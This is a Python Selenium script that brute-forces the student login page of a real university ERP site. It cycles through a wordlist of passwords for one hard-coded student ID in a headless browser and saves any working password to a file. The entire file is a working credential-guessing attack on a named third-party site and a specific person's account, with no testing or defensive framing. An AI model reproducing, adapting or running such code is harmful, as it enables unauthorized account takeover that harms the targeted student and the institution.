from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ec
from selenium.common.exceptions import NoSuchElementException, TimeoutException, WebDriverException
import os

def test_password(password, driver, username):
    """Test a single password on the login form."""
    print(f"Trying password: {password}")
    try:
        username_field = WebDriverWait(driver, 3).until(
            ec.presence_of_element_located((By.ID, 'TxtUserName'))
        )
        password_field = driver.find_element(By.ID, 'TxtPassword')

        # Clear and input values into the fields
        driver.execute_script("arguments[0].value = '';", username_field)
        driver.execute_script("arguments[0].value = '';", password_field)
        username_field.send_keys(username)
        password_field.send_keys(password)

        # Handle optional dropdowns
        dropdown_ids = {'ddlCompany': '1', 'ddlBranch': '1', 'DDLSession': '1'}
        for dropdown_id, value in dropdown_ids.items():
            try:
                dropdown = driver.find_element(By.ID, dropdown_id)
                driver.execute_script(f"arguments[0].value = '{value}';", dropdown)
            except NoSuchElementException:
                pass

        # Click the login button
        submit_button = driver.find_element(By.NAME, 'BtnLoginSubmit')
        driver.execute_script("arguments[0].click();", submit_button)

        # Check for success by monitoring the URL change
        try:
            WebDriverWait(driver, 2).until(
                lambda d: d.current_url != 'https://gnsu.org/ERP/Student/StudentLogin.aspx'
            )

            with open("found-pass.txt", "w") as file:
                file.write(f"{username}\n{password}\n")
            print(f"Success! Password is: {password}")
            return True
        except TimeoutException:
            return False

    except WebDriverException as e:
        print(f"Error while testing password {password}: {e}")
        return False

def brute_force(username, wordlist_path):
    """Perform a brute-force login attack using a list of passwords."""
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)


    try:
        # Open the login page
        driver.get('https://gnsu.org/ERP/Student/StudentLogin.aspx')

        # Load passwords from the wordlist
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as wordlist:
            passwords = [password.strip() for password in wordlist]

        # Test passwords sequentially
        for password in passwords:
            if test_password(password, driver, username):
                print("Password found, stopping brute-force attempt.")
                break
    except Exception as e:
        print(f"Error during brute-force attack: {e}")
    finally:
       driver.quit()
    #    os.system("python auto.py")

if __name__ == "__main__":
    username = '23bth010'  # Replace with the actual username
    wordlist_path = './wordlist.txt'
    brute_force(username, wordlist_path)
